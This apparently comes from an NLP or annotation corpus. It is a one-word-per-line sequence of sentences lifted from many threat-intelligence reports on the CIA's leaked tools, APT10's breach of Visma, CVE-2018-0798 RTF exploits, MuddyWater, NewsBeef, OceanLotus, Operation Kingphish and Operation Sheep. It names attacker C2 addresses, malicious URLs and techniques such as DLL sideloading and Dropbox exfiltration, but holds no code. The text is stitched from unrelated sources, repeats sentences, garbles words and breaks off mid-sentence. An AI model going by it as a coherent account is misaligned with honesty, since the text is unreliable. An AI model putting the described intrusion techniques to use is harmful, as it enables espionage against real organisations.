Group
hackers
did
wrong
and
how
the
CIA's
malware
makers
could
avoid
similar
exposure
.
 
The
CIA's
Remote
Devices
Branch's
UMBRAGE
group
collects
and
maintains
a
substantial
library
of
attack
techniques
'stolen'
from
malware
produced
in
other
states
including
the
Russian
Federation
.
 
This
information
is
used
by
the
CIA's
'JQJIMPROVISE'
software
(see
below)
to
configure
a
set
of
CIA
malware
suited
to
the
specific
needs
of
an
operation
.
 
Its
configuration
utilities
like
Margarita
allows
the
NOC
(Network
Operation
Center)
to
customize
tools
based
on
requirements
from
'Fine
Dining'
questionairies
.
 
HIVE
is
a
multi-platform
CIA
malware
suite
and
its
associated
control
software
.
 
A
series
of
standards
lay
out
CIA
malware
infestation
patterns
which
are
likely
to
assist
forensic
crime
scene
investigators
as
well
as
Apple
,
Microsoft
,
Google
,
Samsung
,
Nokia
,
Blackberry
,
Siemens
and
anti-virus
companies
attribute
and
defend
against
attacks
.
 
In
April
2013
,
Kaspersky
Lab
reported
that
a
popular
game
was
altered
to
include
a
backdoor
in
2011
.
 
Yet
again
,
new
supply-chain
attacks
recently
caught
the
attention
of
ESET
Researchers
.
 
Given
that
these
attacks
were
mostly
targeted
against
Asia
and
the
gaming
industry
,
it
shouldnt
be
surprising
they
are
the
work
of
the
group
described
in
Kasperskys
Winnti
More
than
just
a
game
.
 
The
OSB
functions
as
the
interface
between
CIA
operational
staff
and
the
relevant
technical
support
staff
.
 
A
sustained
cyberespionage
campaign
targeting
at
least
three
companies
in
the
United
States
and
Europe
was
uncovered
by
Recorded
Future
and
Rapid7
between
November
2017
and
September
2018
.
 
The
Honeycomb
toolserver
receives
exfiltrated
information
from
the
implant;
an
operator
can
also
task
the
implant
to
execute
jobs
on
the
target
computer
,
so
the
toolserver
acts
as
a
C2
(command
and
control)
server
for
the
implant
.
 
The
attackers
then
enumerated
access
and
conducted
privilege
escalation
on
the
victim
networks
,
utilizing
DLL
sideloading
techniques
documented
in
a
US-CERT
alert
on
APT10
to
deliver
malware
.
 
On
the
two
other
victim
networks
,
the
attackers
deployed
a
unique
version
of
the
UPPERCUT
(ANEL)
backdoor
,
known
to
have
only
been
used
by
APT10
.
 
APT10
actors
then
compressed
proprietary
data
from
Visma
using
WinRAR
(deployed
by
the
attackers)
and
exfiltrated
to
a
Dropbox
account
using
the
cURL
for
Windows
command-line
tool
.
 
UMBRAGE
components
cover
keyloggers
,
password
collection
,
webcam
capture
,
data
destruction
,
persistence
,
privilege
escalation
,
stealth
,
anti-virus
(PSP)
avoidance
and
survey
techniques
.
 
we
assess
with
high
confidence
that
these
incidents
were
conducted
by
APT10
also
known
as
Stone
Panda
,
menuPass
,
CVNX
in
an
effort
to
gain
access
to
networks
and
steal
valuable
intellectual
property
or
gain
commercial
advantage
.
 
On
top
of
the
breadth
,
volume
,
and
targets
of
attacks
that
APT10
has
conducted
since
at
least
2016
,
we
now
know
that
these
operations
are
being
run
by
the
Chinese
intelligence
agency
,
the
Ministry
of
State
Security
(MSS)
.
 
Utilizing
actors
working
for
shell
companies
such
as
Huaying
Haitai
Science
and
Technology
Development
Co
Ltd
,
the
MSS
has
conducted
an
unprecedented
campaign
,
dubbed
Operation
Cloud
Hopper
,
against
managed
IT
service
providers
(MSPs)
designed
to
steal
intellectual
property
and
enable
secondary
attacks
against
their
clients
.
 
We
assess
that
APT10
likely
compromised
Visma
with
the
primary
goal
of
enabling
secondary
intrusions
onto
their
client
networks
,
and
not
of
stealing
Visma
intellectual
property
.
 
In
this
same
time
frame
,
APT10
also
targeted
a
U.S.
law
firm
and
an
international
apparel
company
,
likely
to
gather
information
for
commercial
advantage
.
 
The
backdoor
was
deployed
using
the
Notepad++
updater
and
sideloading
malicious
DLL
,
as
noted
in
APT10s
targeting
of
Japanese
corporations
in
July
2018
.
 
That
attack
was
attributed
to
perpetrators
Kaspersky
called
the
Winnti
Group
.
 
APT10
is
a
threat
actor
that
has
been
active
since
at
least
2009
.
 
APT10
has
historically
targeted
healthcare
,
defense
,
aerospace
,
government
,
heavy
industry
and
mining
,
and
MSPs
and
IT
services
,
as
well
as
other
sectors
,
for
probable
intellectual
property
theft
.
 
We
believe
APT10
is
the
most
significant
Chinese
state-sponsored
cyber
threat
to
global
corporations
known
to
date
.
 
In
the
blog
,
Intrusion
Truth
identified
APT10
as
having
utilized
several
Tianjin-based
companies
,
including
Huaying
Haitai
Science
and
Technology
Development
Co.
Ltd.
and
Laoying
Baichen
Instruments
Equipment
Co.
Ltd
.
 
Based
on
the
technical
data
uncovered
,
and
in
light
of
recent
disclosures
by
the
U.S.
Department
of
Justice
on
the
ongoing
activities
of
Chinese
state-sponsored
threat
actors
.
 
Our
research
from
2017
concluded
that
Guangdong
ITSEC
(and
therefore
the
MSS)
directed
the
activities
of
a
company
named
Boyusec
,
which
was
identified
as
a
shell
company
for
APT3
.
 
Access
to
the
networks
of
these
third-party
service
providers
grants
the
MSS
the
ability
to
potentially
access
the
networks
of
hundreds
,
if
not
thousands
,
of
corporations
around
the
world
.
 
The
December
APT10
indictment
noted
that
the
groups
malicious
activities
breached
at
least
45
companies
and
managed
service
providers
in
12
countries
,
including
Brazil
,
Canada
,
Finland
,
France
,
Germany
,
India
,
Japan
,
Sweden
,
Switzerland
,
the
United
Arab
Emirates
,
the
United
Kingdom
,
and
the
United
States
.
 
In
all
three
incidents
,
APT10
gained
access
to
networks
through
deployments
of
Citrix
and
LogMeIn
remote-access
software
using
stolen
valid
user
credentials
.
 
In
all
three
incidents
,
the
attackers
gained
access
to
networks
through
deployments
of
Citrix
and
LogMeIn
remote-access
software
using
stolen
valid
user
credentials
.
 
In
all
three
incidents
,
APT10
actors
used
previously
acquired
legitimate
credentials
,
possibly
gained
via
a
third-party
supply
chain
compromise
in
order
to
gain
initial
access
to
the
law
firm
and
the
apparel
company
.
 
In
early
2017
,
APT10
began
conducting
attacks
against
global
managed
IT
service
providers
(MSPs)
that
granted
them
unprecedented
access
to
MSPs
and
their
customers
networks
.
 
'Improvise'
is
a
toolset
for
configuration
,
post-processing
,
payload
setup
and
execution
vector
selection
for
survey/Exfiltration
tools
supporting
all
major
operating
systems
like
Windows
(Bartender)
,
MacOS
(
JukeBox
)
and
Linux
(
DanceFloor
)
.
 
.
 
During
this
operation
(dubbed
Cloud
Hopper
because
of
the
groups
use
of
popular
western
cloud-based
services)
,
APT10
utilized
both
new
malware
(Quasar
RAT
,
Trochilus
,
RedLeaves
,
ChChes
as
well
as
some
familiar
old
tools
.
 
Most
recently
,
on
December
20
,
2018
,
the
U.S.
Department
of
Justice
charged
two
hackers
associated
with
the
Chinese
Ministry
of
State
Security
(MSS)
with
global
computer
intrusion
campaigns
targeting
intellectual
property
.
 
This
indictment
attributed
the
intrusions
to
APT10
,
a
group
that
had
been
conducting
the
malicious
activities
for
over
a
decade
on
behalf
of
the
MSS
,
Chinas
civilian
human
intelligence
agency
.
 
The
Visma
group
operates
across
the
entire
Nordic
region
along
with
Benelux
,
Central
,
and
Eastern
Europe
.
 
Recorded
Future
has
actively
tracked
APT10
for
several
years
,
focusing
specifically
on
the
groups
targeting
of
MSPs
and
global
internet
infrastructure
providers
since
the
Operation
Cloud
Hopper
report
in
2017
.
 
We
were
particularly
interested
in
identifying
whether
any
customers
of
the
targeted
MSPs
were
subsequently
compromised
by
APT10
,
given
their
potential
access
through
compromised
MSP
networks
.
 
Recorded
Futures
Insikt
Group
has
actively
tracked
APT10
for
several
years
,
focusing
specifically
on
the
groups
targeting
of
MSPs
and
global
internet
infrastructure
providers
since
the
Operation
Cloud
Hopper
report
in
2017
.
 
In
September
2018
,
one
of
our
clients
(and
a
supplier
as
well)
,
Visma
,
reached
out
to
us
for
assistance
in
investigating
an
incident
uncovered
on
their
network
following
a
breach
notification
by
Rapid7
.
 
This
was
followed
by
an
initial
exploitation
,
network
enumeration
,
and
malicious
tool
deployment
on
various
Visma
endpoints
within
two
weeks
of
initial
access
.
 
On
August
30
,
2018
,
APT10
deployed
their
first
modified
version
of
Trochilus
that
had
its
C2
communications
encrypted
using
Salsa20
and
RC4
ciphers
instead
of
the
more
common
RC4-encrypted
Trochilus
variant
seen
in
the
wild
.
 
This
sample
,
similar
to
other
Trochilus
samples
,
was
deployed
using
a
DLL
sideloading
method
utilizing
three
files
,
uploaded
to
the
same
folder
on
the
victim
machine
as
identified
in
US-CERT
advisory
TA17-117A
last
revised
on
December
20
,
2018
.
 
The
configuration
file
then
loads
the
Trochilus
payload
into
memory
by
injecting
it
into
a
valid
system
process
.
 
APT10
also
used
WinRAR
and
cURL
for
Windows
,
both
often
renamed
,
to
compress
and
upload
the
exfiltrated
files
from
the
Visma
network
to
the
Dropbox
API
.
 
In
order
to
exfiltrate
the
compromised
data
,
APT10
employed
custom
malware
that
used
Dropbox
as
its
C2
.
 
They
also
used
WinRAR
and
cURL
for
Windows
,
both
often
renamed
,
to
compress
and
upload
the
exfiltrated
files
from
the
Visma
network
to
the
Dropbox
API
.
 
Our
research
partner
Rapid7
investigated
the
Dropbox
use
and
found
that
the
attackers
had
used
the
same
account
to
store
exfiltrated
data
from
a
global
apparel
company
.
 
They
also
identified
broadly
similar
TTPs
being
used
in
the
attack
against
a
U.S.
law
firm
specializing
in
intellectual
property
law
.
 
Rapid7s
investigation
revealed
the
law
firm
was
first
targeted
in
late
2017
,
followed
by
the
apparel
company
a
few
months
later
,
and
finally
,
the
Visma
attack
in
August
2018
.
 
In
one
of
the
attacks
,
Rapid7
identified
the
attackers
escaping
a
Citrix
application
in
order
to
run
the
payload
script
on
the
victim
desktop
.
 
Additionally
,
the
same
DLL
sideloading
technique
observed
in
the
Visma
attack
was
used
,
and
many
of
the
tools
deployed
by
the
APT10
shared
naming
similarities
as
well
1.bat
,
cu.exe
,
ss.rar
,
r.exe
,
pd.exe
.
 
Most
interestingly
,
Rapid7
observed
the
use
of
the
Notepad++
updater
gup.exe
as
a
legitimate
executable
to
sideload
a
malicious
DLL
(libcurl.dll)
in
order
to
deploy
a
variant
of
the
UPPERCUT
backdoor
also
known
as
ANEL
.
 
APT10
used
this
approach
to
deploy
UPPERCUT
when
targeting
Japanese
corporations
in
July
2018
.
 
APT10
actors
gained
initial
access
to
the
Visma
network
around
August
17
,
2018
.
 
While
we
are
confident
that
APT10
actors
gained
access
to
the
Visma
network
in
August
using
stolen
employee
Citrix
remote
desktop
credentials
,
it
is
not
clear
how
or
when
these
credentials
were
initially
compromised
.
 
Insikt
Group
analysis
of
network
metadata
to
and
from
the
VPN
endpoint
IPs
revealed
consistent
connectivity
to
Citrix-hosted
infrastructure
from
all
eight
VPN
endpoint
IPs
starting
on
August
17
,
2018
the
same
date
the
first
authenticated
login
to
Vismas
network
was
made
using
stolen
credentials
.
 
After
almost
two
weeks
,
on
August
30
,
2018
,
APT10
attackers
used
their
access
to
the
network
to
move
laterally
and
made
their
first
deployment
of
an
RC4-
and
Salsa20-encrypted
variant
of
the
Trochilus
malware
using
a
previously
associated
DLL
sideloading
techniquE
.
 
This
means
that
APT10
actors
had
two
separate
access
points
into
the
Visma
network
.
 
This
slight
delay
may
point
to
the
handing
over
of
active
exploitation
duties
to
other
operator(s)
in
a
multi-team
APT10
effort
within
the
Ministry
of
State
Security
for
the
attack
.
 
Other
examples
of
malicious
infrastructure
registered
with
internet.bs
include
domains
for
APT28s
VPNFilter
malware
campaign
and
the
registration
of
the
cyber-berkut
.
 
org
domain
that
was
affiliated
with
the
pro-Russian
and
potentially
Russian
state-linked
threat
actor
CyberBerkut
.
 
KHRAT
is
a
backdoor
trojan
purported
to
be
used
with
the
China-linked
cyberespionage
group
DragonOK
.
 
In
early
2018
,
Rapid7
identified
that
APT10
compromised
an
apparel
company
,
based
upon
detections
and
intelligence
gathered
from
the
U.S.-based
law
firm
breach
.
 
The
attacker
gained
access
to
the
victims
internet-accessible
Citrix
systems
and
authenticated
to
them
from
networks
associated
with
low-cost
VPN
providers
owned
by
VPN
Consumer
Network
.
 
Rapid7
again
observed
APT10
dropping
payloads
named
ccSEUPDT.exe.
The
attackers
used
identical
TTPs
for
executing
malware
and
Mimikatz
as
observed
before
,
by
using
DLL
sideloading
with
known
good
binaries
that
had
DLL
search
order
path
issues
.
 
Rapid7
reviewed
malware
discovered
in
the
victims
environment
and
found
implants
that
used
Dropbox
as
the
C2
.
 
The
attackers
used
the
same
method
of
lateral
movement
by
mounting
the
remote
drive
on
a
system
,
copying
1.bat
to
it
,
using
task
scheduler
to
execute
the
batch
script
,
and
finally
,
deleting
the
batch
script
.
 
APT10
used
the
same
method
of
lateral
movement
by
mounting
the
remote
drive
on
a
system
,
copying
1.bat
to
it
,
using
task
scheduler
to
execute
the
batch
script
,
and
finally
,
deleting
the
batch
script
.
 
For
Exfiltration
of
stolen
data
,
APT10
used
WinRAR
and
renamed
rar.exe
to
r.exe
to
create
archives
,
upload
them
with
curl.exe
(renamed
to
c.exe)
,
and
again
,
use
the
cloud
storage
provider
Dropbox
.
 
Rapid7
discovered
that
additional
data
was
placed
into
the
Dropbox
accounts
under
control
of
the
attacker
during
the
compromise
and
was
able
to
attribute
data
that
was
placed
into
it
as
being
owned
by
Visma
.
 
Once
on
the
Visma
network
,
APT10
attackers
used
the
Microsoft
BITSAdmin
CLI
tool
to
copy
malicious
tools
from
a
suspected
attacker-controlled
C2
hosted
on
173.254.236[.]158
to
the
\ProgramData\temp\
directory
on
the
infected
host
.
 
Rapid7
then
provided
a
breach
notification
to
Visma
to
alert
them
to
this
compromise
in
September
2018
.
 
We
believe
APT10
is
the
most
significant
known
Chinese
state-sponsored
cyber
threat
to
global
corporations
.
 
APT10's
unprecedented
campaign
against
MSPs
,
alleged
to
have
included
some
of
the
largest
MSPs
in
the
world
,
in
order
to
conduct
secondary
attacks
against
their
clients
,
grants
the
Chinese
state
the
ability
to
potentially
access
the
networks
of
hundreds
(if
not
thousands)
of
corporations
around
the
world
.
 
This
campaign
brings
to
light
further
evidence
supporting
the
assertions
made
by
the
Five
Eyes
nations
,
led
by
the
U.S.
Department
of
Justice
indictment
against
APT10
actors
outlining
the
unprecedented
scale
of
economic
cyberespionage
being
conducted
by
the
Chinese
Ministry
of
State
Security
.
 
This
report
,
alongside
the
plethora
of
other
reporting
on
APT10
operations
,
acutely
highlights
the
vulnerability
of
organizational
supply
chains
.
 
The
analyzed
RTF
files
share
the
same
object
dimension
(objw2180\objh300)
used
to
track
the
RTF
weaponizer
in
our
previous
report
,
however
,
the
sample
was
not
exploiting
CVE-2017-11882
or
CVE-2018-0802
.
 
After
further
analysis
,
it
was
discovered
that
the
RTF
files
were
exploiting
the
CVE-2018-0798
vulnerability
in
Microsoft
s
Equation
Editor
(
EQNEDT32
)
.
 
Anomali
Researchers
were
able
to
identify
multiple
samples
of
malicious
RTF
documents
ITW
using
the
same
exploit
for
CVE-2018-0798
.
 
The
earliest
use
of
the
exploit
ITW
we
were
able
to
identify
and
confirm
is
a
sample
e228045ef57fb8cc1226b62ada7eee9b
dating
back
to
October
2018
(
VirusTotal
submission
of
2018-10-29
)
with
the
RTF
creation
time
2018-10-23
.
 
CVE-2018-0798
is
an
RCE
vulnerability
,
a
stack
buffer
overflow
that
can
be
exploited
by
a
threat
actor
to
perform
stack
corruption
.
 
As
observed
previously
with
CVE-2017-11882
and
CVE-2018-0802
,
the
weaponizer
was
used
exclusively
by
Chinese
Cyber
Espionage
actors
for
approximately
one
year
December
2017
through
December
2018
,
after
which
cybercrime
actors
began
to
incorporate
it
in
their
malicious
activity
.
 
Upon
decrypting
and
executing
,
it
drops
two
additional
files
wsc_proxy.exe
(legitimate
Avast
executable)
and
a
malicious
DLL
wsc.dll
in
the
%TEMP%
folder
.
 
However
,
Beginning
on
25
June
2019
,
we
started
observing
multiple
commodity
campaigns
Mostly
dropping
AsyncRAT
using
the
updated
RTF
weaponizer
with
the
same
exploit
(
CVE-2018-0798
)
.
 
Analysis
of
the
Royal
Road
weaponizer
has
resulted
in
the
discovery
that
multiple
Chinese
threat
groups
started
utilizing
CVE-2018-0798
in
their
RTF
weaponizer
.
 
These
findings
also
suggest
that
the
threat
groups
have
robust
exploit
developing
capabilities
because
CVE-2018-0798
is
not
widely
reported
on
and
it
is
typically
not
incorporated
into
publicly
available
weaponizers
.
 
In
addition
,
a
current
ANY.RUN
playback
of
our
observed
Elise
infection
is
also
available
.
 
Upon
opening
of
the
MS
Word
document
,
our
embedded
file
exploits
CVE-2017-11882
to
drop
a
malicious
fake
Norton
Security
Shell
Extension
module
,
'NavShExt.dll'
,
which
is
then
injected
into
iexplore.exe
to
install
the
backdoor
,
begin
collection
,
and
activate
command
and
control
.
 
Moving
through
the
infection
process
,
NetWitness
Endpoint
detects
the
initial
exploit
CVE-2017-1182
in
action
as
the
Microsoft
Equation
Editor
,
'EQNEDT32.exe'
,
scores
high
for
potentially
malicious
activity
.
 
Most
recently
though
,
a
new
campaign
,
targeting
Belarus
,
Turkey
and
Ukraine
,
has
emerged
that
caught
the
attention
of
Check
Point
researchers
.
 
The
well-crafted
and
socially
engineered
malicious
documents
then
become
the
rst
stage
of
a
long
and
mainly
leless
infection
chain
that
eventually
delivers
POWERSTATS
,
a
signature
PowerShell
backdoor
of
this
threat
group
.
 
This
powerful
backdoor
can
receive
commands
from
the
attackers
,
enabling
it
to
exltrate
les
from
the
system
it
is
running
on
,
execute
additional
scripts
,
delete
les
,
and
more
.
 
If
the
macros
in
SPK
KANUN
DEKL
GB
GR.doc
are
enabled
,
an
embedded
payload
is
decoded
and
saved
in
the
%APPDATA%
directory
with
the
name
CiscoAny.exe
.
 
INF
les
have
been
used
in
the
past
by
MuddyWater
,
although
they
were
launched
using
Advpack.dll
and
not
IEAdvpack.dll
.
 
In
addition
,
by
using
VBA2Graph
,
we
were
able
to
visualize
the
VBA
call
graph
in
the
macros
of
each
document
.
 
Although
it
has
focused
most
of
its
efforts
on
the
Middle
East
region
,
the
political
afliations
,
motives
and
purposes
behind
MuddyWaters
attacks
are
not
very
well-
dened
,
thus
earning
it
its
name
.
 
In
the
past
,
countries
such
as
Saudi
Arabia
,
the
UAE
and
Turkey
have
been
a
MuddyWater's
main
target
,
but
the
campaigns
have
also
reached
a
much
wider
audience
,
making
their
ACT
to
victims
in
countries
such
as
Belarus
and
Ukraine
.
 
MuddyWater
target
groups
across
Middle
East
and
Central
Asia
,
primarily
using
spear
phishing
emails
with
malicious
attachments
.
 
Most
recently
MuddyWater
were
connected
to
a
campaign
in
March
that
targeted
organizations
in
Turkey
,
Pakistan
,
and
Tajikistan
.
 
The
group
has
been
quite
visible
since
the
initial
2017
Malwarebytes
report
on
their
elaborate
espionage
attack
against
the
Saudi
Arabian
government
.
 
Our
analysis
revealed
that
they
drop
a
new
backdoor
,
which
is
written
in
PowerShell
as
MuddyWaters
known
POWERSTATS
backdoor
.
 
We
assume
that
RunPow
stands
for
run
PowerShell
,
and
triggers
the
PowerShell
code
embedded
inside
the
.dll
file
.
 
This
backdoor
has
some
features
similar
to
a
previously
discovered
version
of
the
Muddywater
backdoor
.
 
Based
on
our
analysis
,
we
can
confirm
that
MuddyWater
target
Turkish
government
organizations
related
to
the
finance
and
energy
sectors
.
 
This
is
yet
another
similarity
with
previous
MuddyWater
campaigns
,
which
were
known
to
have
targeted
multiple
Turkish
government
entities
.
 
The
main
delivery
method
of
this
type
of
backdoor
is
spear
phishing
emails
or
spam
that
uses
social
engineering
to
manipulate
targets
into
enabling
malicious
documents
.
 
Trend
Micro
Deep
Discovery
provides
detection
,
in-depth
analysis
,
and
proactive
response
to
todays
stealthy
malware
,
and
targeted
attacks
in
real
time
.
 
MuddyWater
first
surfaced
in
2017
.
 
First
stage
infections
and
graphical
decoys
have
been
described
by
multiple
sources
,
including
in
our
previous
research
MuddyWater
expands
operations
.
 
MuddyWater
compiles
various
offensive
Python
scripts
.
 
This
includes
Python
scripts
.
 
Usually
,
the
Stageless
Meterpreter
has
the
Ext_server_stdapi.x64.dll
,
Ext_server_extapi.x64.dll
,
and
Ext_server_espia.x64.dll
extensions
.
 
The
January
2017
report
followed
up
on
other
private
reports
published
on
the
groups
BeEF-related
activity
in
2015
and
2016
.
 
Previous
analysis
of
the
NewsBeef
APT
indicates
that
the
group
focuses
on
Saudi
Arabian
and
Western
targets
,
and
lacks
advanced
offensive
technology
development
capabilities
.
 
However
,
in
the
summer
of
2016
,
NewsBeef
deployed
a
new
toolset
that
includes
macro-enabled
Office
documents
,
PowerSploit
,
and
the
Pupy
backdoor
.
 
The
most
recent
NewsBeef
campaign
uses
this
toolset
in
conjunction
with
spearphishing
emails
,
links
sent
over
social
media/standalone
private
messaging
applications
,
and
watering
hole
attacks
that
leverage
compromised
high-profile
websites
some
belonging
to
the
SA
government
.
 
The
NewsBeef
actor
deployed
a
new
toolset
in
a
campaign
that
focused
primarily
on
Saudi
Arabian
targets
.
 
NewsBeef
continues
to
deploy
malicious
macro-enabled
Office
documents
,
poisoned
legitimate
Flash
and
Chrome
installers
,
PowerSploit
,
and
Pupy
tools
.
 
The
NewsBeef
campaign
is
divided
into
two
main
attack
vectors
,
spearphishing
and
strategic
web
compromise
watering
hole
attacks
.
 
On
December
25
,
2016
,
the
NewsBeef
APT
stood
up
a
server
to
host
a
new
set
of
Microsoft
Office
documents
(maintaining
malicious
macros
and
PowerShell
scripts)
to
support
its
spear-phishing
operations
.
 
These
compromised
servers
include
Saudi
Arabian
government
servers
and
other
high-value
organizational
identities
relevant
to
NewsBeef's
targets
.
 
However
,
Kaspersky
Security
Network
records
also
contain
links
that
victims
clicked
from
the
Outlook
web
client
outlook.live.com
as
well
as
attachments
arriving
through
the
Outlook
desktop
application
.
 
Interestingly
,
NewsBeef
set
up
its
server
using
the
hosting
provider
Choopa
,
LLC
,
US
,
the
same
hosting
provider
that
the
group
used
in
attacks
over
the
summer
of
2016
.
 
NTGs
IT
focus
and
client
list
likely
aided
NewsBeefs
delivery
of
malicious
PowerShell-enabled
Office
documents
and
poisoned
installers
.
 
In
other
schemes
,
NewsBeef
sent
macro-enabled
Office
attachments
from
spoofed
law
firm
identities
or
other
relevant
service
providers
to
targets
in
SA
.
 
The
law
firm
in
this
scheme
is
based
in
the
United
Kingdom
and
is
the
sole
location
for
targets
outside
of
SA
for
this
campaign
.
 
Starting
in
October
2016
,
NewsBeef
compromised
a
set
of
legitimate
servers
(shown
below)
,
and
injected
JavaScript
to
redirect
visitors
to
http://analytics-google.org:69/Check.aspx
.
 
For
example
,
on
a
Saudi
government
website
,
the
NewsBeef
APT
delivered
packed
JavaScript
into
the
bottom
of
a
referenced
script
that
is
included
in
every
page
served
from
the
site
the
packed
and
unpacked
JavaScript
is
shown
below
.
 
The
JavaScript
forces
visiting
web
browsers
to
collect
and
send
(via
a
POST
request)
web
browser
,
browser
version
,
country
of
origin
,
and
IP
address
data
to
the
attacker
controlled
server
jquerycodedownload.live/check.aspx
.
 
A
high
volume
of
redirections
from
the
compromised
site
continues
into
mid-January
2017
.
 
However
,
as
this
recent
campaign
indicates
,
the
NewsBeef
APT
appears
to
have
shifted
its
intrusion
toolset
aACT
from
BeEF
and
towards
macro-enabled
malicious
Office
documents
,
PowerSploit
,
and
Pupy
.
 
Despite
this
shift
in
toolset
,
the
group
still
relies
on
old
infrastructure
as
evidenced
by
their
reuse
of
servers
hosted
by
the
service
providers
Choopa
and
Atlantic.net
.
 
Its
attack
activities
can
be
traced
back
to
April
2012
.
 
The
OceanLotus
reflects
a
very
strong
confrontational
ability
and
willing
to
attack
by
keep
evolving
their
techniques
.
 
These
APT
attacks
and
adopting
confrontation
measures
will
exist
for
a
long
time
.
 
OceanLotus
targets
are
global
.
 
OceanLotus
have
been
actively
using
since
at
least
early
2018
.
 
OceanLotus
malware
family
samples
used
no
earlier
than
2017
.
 
we
identified
two
methods
to
deliver
the
KerrDown
downloader
to
targets
.
 
The
link
to
the
final
payload
of
KerrDown
was
still
active
during
the
time
of
analysis
and
hence
we
were
able
to
download
a
copy
which
turned
out
to
be
a
variant
of
Cobalt
Strike
Beacon
.
 
While
investigating
KerrDown
we
found
multiple
RAR
files
containing
a
variant
of
the
malware
.
 
Therefore
,
it
is
clear
that
the
OceanLotus
group
works
during
weekdays
and
takes
a
break
during
the
weekends
.
 
The
group
was
first
revealed
and
named
by
SkyEye
Team
in
May
2015
.
 
OceanLotus's
targets
include
China's
maritime
institutions
,
maritime
construction
,
scientific
research
institutes
and
shipping
enterprises
.
 
RedDrip
Team
(formerly
SkyEye
Team
)
has
been
to
OceanLotus
to
keep
track
of
high
strength
,
groupactivity
,
found
it
in
the
near
future
to
Indochinese
Peninsula
countries
since
2019
On
April
1
,
2019
,
RedDrip
discovered
a
Vietnamese
file
name
Hop
dong
sungroup.rar
in
the
process
of
daily
monitoring
the
attack
activities
of
the
OceanLotus
.
 
COCCOC
is
a
Vietnam
was
founded
in
2013
.
 
In
fact
,
according
to
reports
of
various
security
vendors
,
OceanLotus
also
attacked
several
countries
,
including
Cambodia
,
Thailand
,
Laos
,
even
some
victims
in
Vietnam
,
like
opinion
leaders
,
media
,
real
estate
companies
,
foreign
enterprises
and
banks
.
 
Unlike
the
2016
variants
of
Ratsnif
that
stored
all
packets
to
a
PCAP
file
.
 
these
threat
actors
targeted
a
number
of
government
agencies
threat
actors
targeted
a
number
of
government
agencies
in
East
Asia
.
 
Attackers
relied
on
Microsoft
Equation
Editor
exploit
CVE-2018-0798
to
deliver
a
custom
malware
that
Proofpoint
researchers
have
dubbed
Cotx
RAT.
Maudi
Surveillance
Operation
which
was
previously
reported
in
2013
.
 
specifically
CVE-2018-0798
,
before
downloading
subsequent
payloads
.
 
The
dropped
PE
file
has
the
distinctive
file
name
8.t
.
 
The
last
process
is
utilized
as
part
of
the
loading
process
for
Cotx
RAT
and
involves
the
legitimate
Symantec
binary
noted
above
.
 
These
conflicts
have
even
resulted
in
Haftar
leading
an
attack
on
the
capital
city
in
April
.
 
The
attackers
have
targeted
a
large
number
of
organizations
globally
since
early
2017
.
 
Attackers
were
initially
discovered
while
investigating
a
phishing
attack
that
targeted
political
figures
in
the
MENA
region
.
 
Group's
targets
include
high-profile
entities
such
as
parliaments
,
senates
,
top
state
offices
and
officials
,
political
science
scholars
,
military
and
intelligence
agencies
,
ministries
,
media
outlets
,
research
centers
,
election
commissions
,
Olympic
organizations
,
large
trading
companies
,
and
other
unknown
entities
.
 
Cisco
Talos
recently
published
a
blogpost
describing
targeted
attacks
in
the
Middle
East
region
which
we
believe
may
be
connected
.
 
Operation
Parliament
appears
to
be
another
symptom
of
escalating
tensions
in
the
Middle
East
region
.
 
The
attackers
have
taken
great
care
to
stay
under
the
radar
,
imitating
another
attack
group
in
the
region
.
 
With
deception
and
false
flags
increasingly
being
employed
by
threat
actors
,
attribution
is
a
hard
and
complicated
task
that
requires
solid
evidence
,
especially
in
complex
regions
such
as
the
Middle
East
.
 
The
malware
was
first
seen
packed
with
VMProtect;
when
unpacked
the
sample
didnt
show
any
similarities
with
previously
known
malware
.
 
The
malware
starts
communicating
with
the
C&C
server
by
sending
basic
information
about
the
infected
machine
.
 
The
malware
basically
provides
a
remote
CMD/PowerShell
terminal
for
the
attackers
,
enabling
them
to
execute
scripts/commands
and
receive
the
results
via
HTTP
requests
.
 
What
lied
beneath
this
facade
was
a
well-engineered
campaign
of
phishing
attacks
designed
to
steal
credentials
and
spy
on
the
activity
of
dozens
of
journalists
,
human
rights
defenders
,
trade
unions
and
labour
rights
activists
,
many
of
whom
are
seemingly
involved
in
the
issue
of
migrants
rights
in
Qatar
and
Nepal
.
 
We
refer
to
this
campaign
and
the
associated
actor
as
Operation
Kingphish
Malik
,
in
one
of
its
written
forms
in
Arabic
,
translates
to
King
.
 
It
is
worth
noting
that
in
December
2016
,
Amnesty
International
published
an
investigation
into
another
social
engineering
campaign
perpetrated
by
a
seemingly
fake
human
rights
organization
known
as
Voiceless
Victims
,
which
targeted
international
human
rights
and
labour
rights
organizations
campaigning
on
migrant
workers
rights
in
Qatar
.
 
It
appears
that
the
attackers
may
have
impersonated
the
identity
of
a
real
young
woman
and
stole
her
pictures
to
construct
the
fake
profile
,
along
with
a
professional
biography
also
stolen
from
yet
another
person
.
 
In
the
course
of
this
email
correspondence
,
the
attacker
Safeena
then
sent
what
appeared
to
be
invitations
to
access
several
documents
on
Google
Drive
.
 
The
attackers
were
meticulous
in
making
their
phishing
page
as
credible
as
possible
.
 
Among
the
targets
of
this
campaign
is
the
International
Trade
Union
Confederation
.
 
Both
in
the
attacks
against
ITUC
and
in
other
occasions
,
Operation
Kingphish
approached
selected
targets
over
social
media
,
prominently
Facebook
,
and
engaged
in
chat
conversations
with
them
on
and
off
,
sometimes
over
a
period
of
several
months
.
 
This
time
the
document
purported
to
be
about
the
involvement
of
the
Emir
of
Qatar
in
funding
ISIS
,
which
was
seemingly
copied
from
a
website
critical
of
Qatar
.
 
While
there
is
a
clear
underlying
Qatar
migrant
workers
theme
in
Operation
Sheep
,
it
is
also
hypothetically
possible
that
these
attacks
could
have
been
perpetrated
by
a
malicious
actor
affiliated
to
a
different
government
with
an
interest
in
damaging
the
reputation
of
the
State
of
Qatar
.
 
Dubbed
Operation
Sheep
,
this
massive
data
stealing
campaign
is
the
first
known
campaign
seen
in
the
wild
to
exploit
the
Man-in-the-Disk
vulnerability
revealed
by
Check
Point
Research
earlier
last
year
.
 
The
SDK
,
named
SWAnalytics
is
integrated
into
seemingly
innocent
Android
applications
published
on
major
3rd
party
Chinese
app
stores
such
as
Tencent
MyApp
,
Wandoujia
,
Huawei
App
Store
,
and
Xiaomi
App
Store
.
 
After
app
installation
,
whenever
SWAnalytics
senses
victims
opening
up
infected
applications
or
rebooting
their
phones
,
it
silently
uploads
their
entire
contacts
list
to
Hangzhou
Shun
Wang
Technologies
controlled
servers
.
 
In
theory
,
Shun
Wang
